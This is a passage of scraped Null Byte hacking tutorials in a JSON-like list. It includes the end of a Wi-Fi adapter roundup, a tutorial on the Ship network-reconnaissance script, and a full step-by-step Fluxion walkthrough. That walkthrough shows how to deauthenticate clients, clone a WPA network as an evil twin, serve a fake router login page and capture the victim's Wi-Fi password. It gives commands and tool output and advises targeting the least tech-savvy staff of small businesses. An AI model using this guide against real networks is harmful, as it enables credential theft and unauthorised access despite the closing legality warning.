chipset (RT5372), so make sure yours has the correct chipset!\nThe PAU05, a super low-profile option that is one of my favorites. Image by SADMIN/Null Byte\nAdapters That Use the Atheros AR9271 Chipset\nThe Alfa AWUS036NHA 2.4 GHz($37.69 on Amazon)\nThe Alfa AWUS036NHA is my current long-range network adapter and the standard by which I judge other long-range adapters. For a long-range application, this paired with a ridiculously big adapter ($9.99) is a stable, fast, and well-supported b/g/n wireless network adapter.\nThe AWUS036NHA, featuring great long-range performance. Image by SADMIN/Null Byte\nThe TP-LINK TL-WN722N 2.4 GHz($14.99 on Amazon)\nA favorite for newbies and experienced hackers alike, this compact b/g/n is among the cheapest but boasts surprisingly impressive performance. That being said, only v1 of this adapter will work with Kali Linux. The v2 version of this adapter is a different chipset, so make sure you check to see which yours is!\nWARNING: Only version ONE of this adapter will work with Kali. Image by SADMIN/Null Byte\nAdapters That Use the Ralink RT5370N Chipset\nThe Detroit DIY Electronics Wifi Antenna For Raspberry Pi($11.99 on Amazon)\nWhile I haven't tested this IEEE 802.11n compatible adapter personally, the chipset is supported in Kali and it supports monitor mode. For an extremely compact adapter with an external antenna mount for swapping different types of antennas, the Detroit DIY Electronics Wifi Antenna For Raspberry Pi is a good starter option.\nCompact option from Detroit Electronics. Image via Detroit Electronics\nAdapters That Use the Realtek RTL8812AU Chipset (New)\nThe Alfa AWUS036ACH 802.11ac AC1200 Wide-Range USB 3.0 Wireless Adapter with External Antenna($59.99 on Amazon)\nNewly supported in 2017, the Alfa AWUS036ACH is a beast, with dual antennas and 2.4 GHz 300 Mbps/5 GHz 867 Mbps – 802.11ac and a, b, g, n compatibility. This is the newest offering I've found that's compatible with Kali, so if you're looking for the fastest and longest range, this would be the adapter to start with.\nTo use this, you may need to first run the following.\napt updateapt install realtek-rtl88xxau-dkms\nThis will install the needed drivers, and you should be good to go.\nThe Alfa AWUS036ACH, ready to hack on 802.11ac. Image via Alfa Website\nOther Options\nDuring my research, I also came across the following adapters with supported chipsets, but only anecdotal evidence of packet injection and monitor mode. If you're feeling adventurous, you can pick up one of the following supported adapters mention in the comments how it works for you.\nThe WiFi Module 4 ($27.95) by Hard Kernel uses the supported Ralink RT5572 chipset, which adds 5 GHz capabilities, and also works in 2.4 GHz.\nAn ultra-compact option is also the WiFi Module 0 ($7.95), also by Hard Kernel, based on Ralink RT5370N chipset.\nSome of the top wireless network adapters for hacking. Image by SADMIN/Null Byte\nThat completes my roundup of wireless network adapters for hacking in 2019. Got a favorite I didn't list? Leave a comment and link us to it.",
        "category": "Wifi Hacking"
    },
    {
        "title": "Capturing WPA Passwords by Targeting Users with a Fluxion Attack",
        "link": "https://null-byte.wonderhowto.com/how-to/hack-wi-fi-capturing-wpa-passwords-by-targeting-users-with-fluxion-attack-0176134/",
        "content": "* WonderHowTo\nWith tools such as Reaver becoming less viable options for pen-testers as ISPs replace vulnerable routers, there become fewer certainties about which tools will work against a particular target. If you don't have time to crack the WPA password or it's unusually strong, it can be hard to figure out your next step. Luckily, nearly all systems have one common vulnerability you can count on — users!\nSocial engineering goes beyond hardware and attacks the most vulnerable part of any system, and one tool that makes it super easy is Fluxion. Even the most antisocial hacker can hide behind a well-crafted login page, and Fluxion automates the process of creating a fake access point to capture WPA passwords.\nPicking the Weakest Links to Attack\nUsers are almost always the weakest link of a system, and so attacks against them are often preferred because they are cheap and effective. Hardware concerns can often be ignored if the users are sufficiently inexperienced with technology to fall for a social engineering attack. While social engineering attacks may raise flags within more tech-savvy organizations, phishing and spoofing attacks against users are the tool of first choice for both nation states and criminal hackers.\nOne of the most vulnerable targets to this kind of attack is a small- or medium-sized business focused on an industry other than technology. These businesses usually have many vulnerable or unpatched systems with default credentials that are easy to exploit over their wireless network and are not likely to know what an attack looks like.\nHow Fluxion Works Its Magic\nFluxion is the future — a blend of technical and social engineering automation that tricks a user into handing over the Wi-Fi password in a matter of keystrokes. Specifically, it's a social engineering framework using an evil twin access point (AP), integrated jamming, and handshake capture functions to ignore hardware and focus on the \"wetware.\" Tools such as Wifiphisher execute similar attacks but cannot verify the WPA passwords supplied.\n* Don't Miss: Create an Evil Twin Wireless AP to Eavesdrop on Data\nImage by Kody/Null Byte\nFluxion evolved from an advanced social engineering attack named Lindset, where the first tool was written mostly in Spanish and suffered from several bugs. Fluxion is a rewritten attack to trick inexperienced users into divulging the password/passphrase of the network.\nFluxion is a unique tool in its use of a WPA handshake to not only control the behavior of the login page but the behavior of the entire script. It jams the original network and creates a clone with the same name, enticing the disconnected user to join. It presents a fake login page indicating the router needs to restart or load firmware and requests the network password to proceed. Simple as that.\nThe tool uses a captured handshake to check the password entered and continues to jam the target AP until the correct password is entered. Fluxion uses Aircrack-ng to verify the results live as they are entered, and a successful outcome means the password is ours.\n* Don't Miss: Cracking WPA2-PSK Passwords Using Aircrack-Ng\nChecking WPA password capture confirming through Aircrack-ng. Image by Kody/Null Byte\nTactically, the attack is only as good as the fake login screen. Many have been added to Fluxion since it was created, and it's possible to develop other screens with some research. In general, running the attack with default login screens will immediately call attention from a more experienced user or tech-savvy organization. The attack is most effective when targeted at whoever is the oldest or least tech-savvy in an organization. Sensitive APs with intrusion detection systems may detect and attempt to defend against the attack by blocking your IP in response to the integrated jamming.\nSystem Compatibility & Requirements\nFluxion works on Kali Linux. Just make sure that you are fully updated or that you're running Kali Rolling to ensure the system and dependencies are current. You may run it on your dedicated Kali install in a virtual machine. If you're looking for a cheap, handy platform to get started on, check out our Kali Linux Raspberry Pi build using the Raspberry Pi 3 or Raspberry Pi 4. The tool will not work over SSH since it relies on opening other windows.\n* Don't Miss: Set Up a Headless Raspberry Pi with Kali Linux\nFor it to work, we'll need to use a compatible wireless network adapter. Check out our list of Kali Linux compatible wireless network adapters or just grab our most popular adapter for beginners. Make sure that your wireless adapter capable of monitor mode is plugged in and recognized by Kali and seen when iwconfig or ifconfig is entered.\n* Don't Miss: Buy the Best Wireless Network Adapter for Wi-Fi Hacking in 2019\nHow to Capture WPA Passwords with Fluxion\nOur goal in this article will be to target an organization via its WPA encrypted Wi-Fi connection. We will launch an attack against users attached to the access point \"Probe,\" capture a handshake, set up a cloned (evil twin) AP, jam the target AP, set up a fake login page, and confirm the captured password against the handshake.\nStep 1: Install Fluxion\nThe developer of Fluxion shut down the product recently, but you can get an older version of it to use still. To get the older version of Fluxion running on your Kali Linux system, clone the Git repository with:\n~# git clone https://github.com/wi-fi-analyzer/fluxion\nCloning into 'fluxion'...\nremote: Enumerating objects: 2646, done.\nremote: Total 2646 (delta 0), reused 0 (delta 0), pack-reused 2646\nReceiving objects: 100% (2646/2646), 26.14 MiB | 83.00 KiB/s, done.\nResolving deltas: 100% (1433/1433), done.\nCheck for missing dependencies by navigating to the folder, then list the contents to see what's in it.\n~# cd fluxion\n~/fluxion# ls\ndocs        install   lib     logos      siteinstaller.py\nfluxion.sh  language  locale  README.md  sites\nNext, start it up for the first time with ./fluxion.sh (if not root, use sudo ./fluxion.sh). You'll likely see the following, where some dependencies will be needed.\n~/fluxion# ./fluxion.sh\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[                                                      ]\n[      FLUXION 2    < Fluxion Is The Future >          ]\n[                                                      ]\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\naircrack-ng.....OK!\naireplay-ng.....OK!\nairmon-ng.......OK!\nairodump-ng.....OK!\nawk.............OK!\ncurl............OK!\ndhcpd...........Not installed (isc-dhcp-server)\nhostapd.........OK!\niwconfig........OK!\nlighttpd........Not installed\nmacchanger......OK!\nmdk3............OK!\nnmap............OK!\nphp-cgi.........Not installed\npyrit...........OK!\npython..........OK!\nunzip...........OK!\nxterm...........OK!\nopenssl.........OK!\nrfkill..........OK!\nstrings.........OK!\nfuser...........OK!\nTo fetch dependencies needed and set your board to green, install the missing ones from the list. In my case, it's dhcpd, lighttpd, and php-cgi.\n~/fluxion# apt install dhcpd lighttpd php-cgi\nFor dhcpd, if it installs udhcpd instead, run the following command to get the right one.\n~/fluxion# apt install isc-dhcp-server\nAfter all the dependencies are met, the board is green, and you can proceed to the attack interface. Run the Fluxion command again with ./fluxion.sh (or sudo ./fluxion.sh) to get hacking.\n~/fluxion# ./fluxion.sh\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[                                                      ]\n[      FLUXION 2    < Fluxion Is The Future >          ]\n[                                                      ]\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[2] Select your language\n[1] English\n[3] Romanian\n[4] Turkish\n[5] Spanish\n[6] Chinese\n[7] Italian\n[10] French\n[11] Slovenian\n[deltaxflux@fluxion]-[~] 1\nStep 2: Scan Wi-Fi Hotspots\nThe first option is to select the language. Do so by typing the number next to the one you want and press Enter to proceed to the interface selector. Here, you'll see all of your connected network interfaces. Choose the number next to the one that you want, in my case, 1 for wlan2.\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[                                                      ]\n[      FLUXION 2    < Fluxion Is The Future >          ]\n[                                                      ]\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\nSelect an interface\n[1] wlan2         Atheros AR9271  ath9k\n[2] wlan1         Ralink RT2870/3070      rt2800usb\n[3] wlan0         Atheros AR9565  ath9k\n[deltaxflux@fluxion]-[~] 1\nThat will take you to the target identification stage. If the channel of the network you wish to attack is known, you may enter 2 to narrow the scan to the desired channel. Otherwise, select 1 to scan all channels.\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[                                                      ]\n[      FLUXION 2    < Fluxion Is The Future >          ]\n[                                                      ]\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[i] Select channel\n[1] All channels\n[2] Specific channel(s)\n[deltaxflux@fluxion]-[~] 1\nA WiFi Monitor window will open while it occurs, so allow the scan to collect wireless data for at least 30 seconds. It's essential to let the attack run for at least 30 seconds to verify if a client is connected to the network. Press Control-C or click the window's (x) to stop the capture process whenever you spot the wireless network that you want. After you do so, the window will close and the results will appear back in the terminal.\nStep 3: Choose Your Target AP\nSelect a target with active clients for the attack to run on by entering the number next to it. Unless you intend to wait for a client to connect (possibly for a long time), the attack will not work on a network without any clients. Without anyone connected to the network, who would we trick into giving us the password?\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[                                                      ]\n[      FLUXION 2    < Fluxion Is The Future >          ]\n[                                                      ]\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\nID      MAC                     CHAN    SECU        PWR     ESSID\n[1]     BC:F6:85:04:A9:98       9       WPA2        26%     ACR North\n[2]     14:AB:F0:CC:6E:90       4       WPA2        30%     cpc-office\n[3]     B4:75:0E:B4:54:DO       1       WPA2        34%     JadeMagnolia\n[4]*    E8:AD:A6:55:31:9E       11      WPA         34%\n[5]     E8:ED:05:7A:4D:70       6       WPA2        36%     DG1670A72\n[6]     A4:2B:BO:E9:5B:6D       1       WPA2        34%     MEDICO\n[7]     28:9E:FC:62:7A:E6       1       WPA2        37%     MySpectrumWiFie0-2G\n[8]     84:A0:6E:C6:93:CE       1       WPA2        37%     MyspectrumWiFic8-2G\n[9]     9C:A3:A9:62:7C:E4       14      WPA2        36%     NVR9ca3a9627ce4\n[10]    AC:5D:10:4A:95:2A       11      WPA2        36%     ATT304\n[11]    8C:A2:FD:00:18:A5       6       WPA2        36%     HungryCandy\n[12]    BO:98:2B:4E:62:AE       1       WPA2        36%     MySpectrumWiFia8-2G\n[13]    A4:08:F5:70:79:8A       1       WPA2        36%     MySpectrumWiFi84-2G\n[14]    A0:39:EE:7E:63:DA       1       WPA2        36%     MINDEOK-2G\n[15]    24:79:2A:93:50:38       7       WPA2        34%     TWCWiFi-Passpoint\n[16]    24:79:2A:13:50:39       7       WPA2        34%     SpectrumWiFi Plus\n[17]    8C:A2:FD:00:05:8E       6       WPA2        37%     LavishBest\n[18]    AC:EC:80:09:65:CO       1       WPA2        37%     SHIN\n[19]    00:AC:E0:91:65:80       1       WPA2        39%     SMQ 2.4\n[20]    1A:91:82:8E:DF:FB       4       WPA2        38%\n[21]    B2:52:16:21:47:E9       4       WPA2        38%     DIRECT-6SMFC-L5700DW_BR47e9\n[22]    10:05:31:32:BB:30       11      WPA2        39%     GoGo Foot\n[23]    EC:0E:C4:73:09:A7       1       WPA2        38%     WIFI73C9A4\n[24]    20:E5:2A:4D:A6:F2       1       WPA2        38%     Netgear 100-2G\n[25]    98:6B:3D:DF:64:50       6       WPA2        40%     Undefined\n[26]    8C:A2:FD:00:9C:AD       6       WPA2        39%     Wittyslim\n[27]    F4:6B:EF:30:0F:OE       1       WPA2        40%     PT STOP\n[28]    38:3B:C8:02:59:66       4       WPA2        38%     ATT386\n[29]    8C:A2:FD:01:23:28       6       WPA2        40%     Donna :)\n[30]    FE:EC:DA:A4:06:40       6       WPA2        40%\n[31]    84:A0:6E:C2:0A:2E       1       WPA2        41%     MyspectrumWiFi28-2G\n[32]    98:6B:3D:CA:45:70       9       WPA2        42%     DG1670A72\n[33]    14:91:82:8E:DF:FB       4       WPA2        40%     FBISurveillanceTruck\n[34]    AC:E2:03:10:75:8A       5       WPA2        42%     DIRECT-89-HP Officejet Pro 6970\n[35]    OE:A2:FD:01:2B:28       6       WPA2        41%     Donna :) _Guest\n[36]    34:6B:46:40:5A:5A       6       WPA2        42%     MySpectrumWiFi54-2G\n[37]    50:33:8B:68:2D:74       1       WPA2        41%\n[38]    1C:B9:04:6B:6D:53       3       WPA2        42%     island-2B6D50\n[39]    8C:A2:FD:00:63:41       6       WPA2        43%     Stevefi\n[40]    F4:6B:EF:1E:AA:C6       1       WPA2        43%     Happy777-2G\n[41]    1C:BO:44:CD:34:FO       5       WPA2        44%     MySpectrumWiFif2-2G\n[42]    AC:EC:80:A8:F6:FO       6       WPA2        44%     TG1672GF2\n[43]*   88:DC:96:55:72:00       1       WPA2        47%     anchor\n[44]    BO:6E:BF:DB:C1:B8       1       WPA2        45%     claire\n[45]    90:1A:CA:6C:07:00       1       WPA2        47%     piccadilly\n[46]*   40:20:09:2A:64.90       11      WPA2        46%     spot 2.4 ghz\n[47]    60:19:71:EE:A9:20       11      WPA2        45%     seoultaxservice\n[48]    OC:EA:C9:77:83:00       11      WPA         46%\n[49]    DO:17:02:B2:06:08       8       WPA2        48%     ATI-Guest\n[50]    60:38:E0:89:F5:02       3       WPA2        47%     thlee174\n[51]    8C:FE:74:79:E3:73       9       WPA2        46%     island-39E370\n[52]    40:70:09:74:48:BO       6       WPA2        47%     Envy\n[53]    28:9E:FC:62:5B:26       1       WPA2        48%     MySpectrumWiFi20-2G\n[54]    94:91:7F:25:41:B1       5       WPA2        58%     SSooniestyle\n[55]    C4:01:7C:13:10:09       11      WPA2        60%     TWCWiFi-Passpoint\n[56]    CC:20:21:38:33:11       10      WPA2        36%     DT TUTORING\n[57]    AC:B3:13:07:42:70       11      WPA2        28%     Vog Hair Salon-1\n[58]    28:9E:FC:67:61:06       11      WPA2        40%     MySpectrumWiF100-2G\n[59]    DC:EF:09:CD:30:37       11      WPA2        36%     fobdawg_EXT\n[60]    AC:B3:13:7A:4A:90       11      WPA2        38%     Gryffindor\n[61]    C4:01:7C:53:10:08       11      WPA2        58%     SpectrumWiFi Plus\n[62]    8C:A2:FD:01:34:46       6       WPA2        35%     Chiefrutabaga\n[63]    8C:A2:FD:00:41:B3       6       WPA2        35%     NNND_NET\n[64]    CO:C1:CO:B6:F3:71       6       WPA2        39%     SilverHorse\n[65]    24:F5:A2:2D:F8:09       6       WPA2        36%     LALASHOP2.4\n[66]    60:72:20:3D:B6:50       6       WPA2        39%     MBC NEW MEDIA ROOM\n[67]    08:02:8E:BB:18:1B       -1      WPA2        99%\n(*) Active clients\nSelect target. For rescan type r\n[deltaxflux@fluxion]-[~] 46\nStep 4: Select Your Attack\nOnce you've typed the number of the target network, in my case, 46, press Enter to load the network profile into the attack selector. For demonstration purposes, I'll use option 1 to make a \"FakeAP\" using Hostapd. It will create a fake hotspot using the captured information to clone the target access point.\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[                                                      ]\n[      FLUXION 2    < Fluxion Is The Future >          ]\n[                                                      ]\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\nSSID = spot 2.4 ghz / WPA2\nChannel = 11\nSpeed = 95 Mbps\nBSSID = 40:70:09:7A:64:90 (ARRIS Group, Inc. )\n[2] Select Attack Option\n[1] FakeAP - Hostapd (Recommended)\n[2] FakeAP - airbase-ng (Slower connection)\n[3] Bruteforce - (Handshake is required)\n[deltaxflux@fluxion]-[~] 1\nStep 5: Get a Handshake\nTo verify that the password you receive works, you can check it against a captured handshake. If you have a handshake, you can enter it on the next screen. If not, we can press Enter to force the network to provide a handshake in the next step.\nhandshake location   (Example: /root/fluxion.cap)\nPress ENTER to skip\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[                                                      ]\n[      FLUXION 2    < Fluxion Is The Future >          ]\n[                                                      ]\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[2] Handshake check\n[2] aircrack-ng (Miss chance)\n[deltaxflux@fluxion]-[~] 2\nThe screen to check that handshake will appear as seen above. Using the Aircrack-ng method by selecting option 2, Fluxion will send deauthentication packets to the target AP as the client and listen in on the resulting WPA handshake. But first, you need to choose who to deauth, which I'd recommend option 3 so you only deauth the target and not everyone.\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[                                                      ]\n[      FLUXION 2    < Fluxion Is The Future >          ]\n[                                                      ]\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[2] *Capture handshake*\n[1] Deauth all\n[2] Deauth all [mdk3]\n[3] Deauth target\n[4] Rescan networks\n[deltaxflux@fluxion]-[~] 3\nTwo windows will pop up, one for Capturing data on channel and one for Deauthenticating client. In the first window, at the top, look out for the \"WPA handshake\" to appear. When you see it, as it does in the top right of the screenshot below, you have captured the handshake.\n* Don't Miss: Cracking WEP Passwords with Aircrack-Ng\nClose both of those windows. Back in the terminal, type 1 for \"Check handshake,\" and hit Enter to load the handshake into your attack configuration.\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[                                                      ]\n[      FLUXION 2    < Fluxion Is The Future >          ]\n[                                                      ]\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[2] *Capture handshake*\nStatus handshake:\n[1] Check handshake\n[3] Select another network\nNow, create an SSL certificate, option 1, so you can create a pop-up without causing alarm and preventing the browser from navigating to it.\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[                                                      ]\n[      FLUXION 2    < Fluxion Is The Future >          ]\n[                                                      ]\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\nCertification invalid or not present, please choice\n[1] Create a SSL certificate\n[2] Search for SSl certificate\nStep 6: Create the Fake Login Page\nNow it's time to create the fake login page. Select option 1 for \"Web Interface\" to use the social engineering tool.\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[                                                      ]\n[      FLUXION 2    < Fluxion Is The Future >          ]\n[                                                      ]\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\nSSID = spot 2.4 ghz / WPA2\nChannel = 11\nSpeed = 95 Mbps\nBSSID = 40:70:09:7A:64:90 (ARRIS Group, Inc. )\n[2] Select your option\n[1] Web interface\n[2] Bruteforce\nYou will be presented with a menu of different fake login pages you can offer to the user. These are customizable with some work but should match the device and language. The defaults should be tested before use, as some are not very convincing. I chose an English language Netgear attack, option 27.\nNow for the final step to arm the attack. At this point, you are ready to fire, so press Enter after selecting your language option to launch the attack.\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[                                                      ]\n[      FLUXION 2    < Fluxion Is The Future >          ]\n[                                                      ]\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\nSSID = spot 2.4 ghz / WPA2\nChannel = 11\nSpeed = 95 Mbps\nBSSID = 40:70:09:7A:64:90 (ARRIS Group, Inc. )\n[2] Select Login Page\n[1]  English        [ENG]   (NEUTRA)\n[2]  German         [GER]   (NEUTRA)\n[3]  Russian        [RUS]   (NEUTRA)\n[4]  Italian        [IT]    (NEUTRA)\n[5]  Spanish        [ESP]   (NEUTRA)\n[6]  Portuguese     [POR]   (NEUTRA)\n[7]  Chinese        [CN]    (NEUTRA)\n[8]  French         [FR]    (NEUTRA)\n[9]  Turkish        [TR]    (NEUTRA)\n[10] Romanian       [RO]    (NEUTRA)\n[11] Hungarian      [HU]    (NEUTRA)\n[12] Arabic         [ARA]   (NEUTRA)\n[13] Greek          [GR]    (NEUTRA)\n[14] Czech          [CZ]    (NEUTRA)\n[15] Norwegian      [NO]    (NEUTRA)\n[16] Bulgarian      [BG]    (NEUTRA)\n[17] Serbian        [SRB]   (NEUTRA)\n[18] Polish         [PL]    (NEUTRA)\n[19] Indonesian     [ID]    (NEUTRA)\n[20] Dutch          [NL]\n[21] Danish         [DAN]\n[22] Hebrew         [HE]\n[23] Thai           [TH]\n[24] Portuguese     [BR]\n[25] Slovenian      [SVN]\n[26] Belkin         [ENG]\n[27] Netgear        [ENG]\n[28] Huawei         [ENG]\n[29] Verizon        [ENG]\n[30] Netgear        [ESP]\n[31] Arris          [ESP]\n[32] Vodafone       [ESP]\n[33] TP-Link        [ENG]\n[34] Ziggo          [NL]\n[35] KPN            [NL]\n[36] Zigoo2016      [NL]\n[37] FRITZBOX_DE    [DE]\n[38] FRITZBOX_ENG   [ENG]\n[39] GENEXIS_DE     [DE]\n[40] Login-Netgear  [Login-Netgear]\n[41] Login-Xfinity  [Login-Xfinity]\n[42] Telekom\n[43] Google\n[44] MOVISTAR       [ESP]\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[                                                      ]\n[      FLUXION 2    < Fluxion Is The Future >          ]\n[                                                      ]\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[i] Attack in Progress ..\n[1] Choose another network\nThe attack spawns multiple windows to create a cloned version of their wireless network while simultaneously jamming the common access point, enticing the user to join the identically named, but unencrypted, network.\nStep 7: Capture the Password\nThe user is directed to a fake login page, which is either convincing or not, depending on which you chose.\nPerhaps not the most elegant deception, but these files are configurable.\nEntering the wrong password will fail the handshake verification, and the user is prompted to try again. Upon entering the correct password, Aircrack-ng verifies and saves the password to a text file while displaying it on the screen. The user is directed to a \"thank you\" screen as the jamming ceases and the fake access point shuts down.\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[                                                      ]\n[      FLUXION 2    < Fluxion Is The Future >          ]\n[                                                      ]\n[~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~]\n[-] Cleaning and closing\n[-] Disabling monitoring interface mon0\n[-] Disabling interface wlan1\n[-] Disabling forwarding of packets\n[-] Cleaning iptables\n[-] Restoring tput\n[-] Delete files\n[-] Restarting Network-Manager\n[-] Cleanup performed successfully!\n[+] Thanks for using fluxion\nYou can verify your success by checking the readout of the Aircrack-ng WiFi Information screen.\nCongratulations, you've succeeded in obtaining and verifying a password, supplied by targeting the \"wetware.\" You've tricked a user into entering the password rather than relying on a preexisting flaw with the security.\nWarning: This Technique Could Be Illegal Without Permission\nLegally, Fluxion combines scanning, cloning, creating a fake AP, creating a phishing login screen, and using the Aircrack-ng script to obtain and crack WPA handshakes. As such, it leaves signatures in router logs consistent with using these techniques. Most of these practices are illegal and unwelcome on any system you don't have permission to audit.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo and screenshots by Kody/Null Byte",
        "category": "Wifi Hacking"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker: Using Ship for Quick & Handy IP Address Information",
        "link": "https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-ship-for-quick-handy-ip-address-information-0181593/",
        "content": "* WonderHowTo\nWhether you're white hat, black hat, or some shade in-between, navigating through a network is a core part of hacking. To do that, we need to be able to explore a network to discover the addresses of gateways, interfaces, and other attached devices. When ifconfig just isn't enough, you can steer your way around a network with a convenient tool called Ship, the script for everything IP.\nWhat Is Ship?\nCreated by Sotirios Roussis, Ship is a portmanteau of \"shell\" and \"IP\" and it's literally a shell script that displays network addresses. However, that description doesn't really give it justice. Ship is a very handy tool. I like to think of it as a one-stop-shop for basic network reconnaissance and addressing.\nShip can display everything from the gateway IP address to the IP and MAC addresses of all the active devices on a network. It can do simple things like ping and traceroute, as well as more sophisticated things like listening in on ports and calculating binary and hex information about an IP. The command syntax in Ship is simple and straightforward, and I recommend it to everyone who finds themselves poking around Wi-Fi networks via terminal on a regular basis.\nPreviously: Using Start-Up Scripts in Linux\nStep 1: Downloading & Installing Ship\nIn this tutorial, I'm using Black Arch Linux, so the commands may be slightly different if you're using Kali or another Linux distribution.\nDepending on what repositories your package manager checks, you might be able to install Ship directly with a simple apt-get or equivalent command. On my system, this wasn't the case, so I'm going to detail how to install Ship manually.\nFirst, we need to install the appropriate dependencies. To do this, use the following command in Black Arch.\npacman -S gawk grep iproute2 mtr iputils sed traceroute wget\nIf you're using a Debian-based system like Kali, this command should work the same if you replace pacman -S with apt-get install and iputils with iputils-ping.\nIn my case, all of these packages were already installed, but it doesn't hurt to check. If you already have them installed like I did, the command will update them instead, which is always a good thing.\nAfter we install the dependencies, we need to clone the GitHub repository. I chose to do this in the root directory of my Linux system, so it will be downloaded into /root/ship. Use the following command in a terminal window to download Ship directly from GitHub.\ngit clone --branch=master https://github.com/xtonousou/ship.git\nThis will download the ship.sh shell file into /root/ship. As is, we won't be able to call Ship simply by typing ship into the terminal. To do this, navigate to Ship's directory with cd /root/ship and then copy ship.sh and rename it to ship by typing cp ship.sh ship into a terminal window.\nThis lets us type ship instead of having to type ship.sh. Then, to add it to the PATH variable everytime the terminal runs, by typing:\necho 'export PATH=/root/ship:$PATH'>>~/.bashrc\nStep 2: Using Ship for Quick Addressing\nNow that we've installed Ship, let's browse some of its features. One of Ship's most handy uses is that it can quickly serve up the exact information about the network we need without displaying superfluous information. For instance, if all we want is to find just the name of the active network interface connected to our device, type ship -i.\nYou can see in the picture below that my laptop's internal wireless adapter is called wlo1. If we also want that interface's IP address, type ship -4 or ship -6 for IPv4 or IPv6 addresses, respectively. We can also find the internal (private) IP address of the network gateway by typing ship -g.\nSo far, this is all stuff we can easily access already with ifconfig or ip a, although for convenience, Ship will display this information more concisely. But let's move on to some cooler stuff Ship can do, like quickly displaying all the devices on the current subnet. Type ship -H or ship -HM (to also display a device's corresponding MAC address) and you'll see a table of all active network hosts, like in the picture below.\nIn addition, you can quickly see what your external IP address is by typing ship -e. You can also use this same command with a URL to find the IP address associated with website by typing ship -e url, with \"url\" replaced by the site you want the IP address of.\nStep 3: Port Listening with Ship\nShip can also show real-time information on all the external IP addresses you are connecting to on a specific port. By typing ship -p portNumber, Ship will display a table of counts and IP addresses that updates every few seconds. In the screenshot below, I tested this on port 80, displaying all active port connections.\nAll the IP addresses to the right are outgoing connections through port 80. We can see a connection to Google if we look up the last IP address (216.58.193.206) in a browser, as it redirects to Google.com.\nStep 4: Calculating IP Information\nIf you need to convert an IP address into binary or hexadecimal, you can type the ship -c address command. This will also display a plethora of other information for you, including the subnet mask, the class of network associated with the address, and the maximum amount of hosts that network can support.\nI tried using this command with multiple different IP addresses of various classes. Ship labels whether the IP address belongs to a private network and whether it belongs to class A, B, C, D, or E.\nOne thing to note is that you can use this command with CIDR notation. For instance, when I type 10.1.1.1/16, it correctly calculates the network mask to be 255.255.0.0 and the max number of hosts to be 65,534, as opposed to the standard 255 in a normal class C 198.192.x.x/24 type network. This can tell us a lot about the purpose of the network we're examining.\nShip Can Answer Network Questions\nIf you're new to networking or need to navigate through an uncharted network, Ship is like a compass to show you what's out there and how to get where you want to go. With a few simple commands, even a beginner can discover connected devices and quietly gather information about a network and the way it is administered. Ship makes it easy to find the network information you need for other commands, down to the driver being used by each network interface.\nKeep in mind, Ship organizes other tools that do the behind the scenes work. Some of these tools can leave logs in the router, firewall, or intrusion-detection system. While scanning generally isn't illegal, it's often seen as a preparation for an attack and can get you blocked from a well-defended network.\nIf you have any questions, you can comment below or ask me on Twitter @blackslash6.",
        "category": "Linux Basics"
    },
    {
        "title": "Linux Basics for the Aspiring Hacker: Using Start-Up Scripts",
        "link": "https://null-byte.wonderhowto.com/how-to/linux-basics-for-aspiring-hacker-using-start-up-scripts-0168875/",
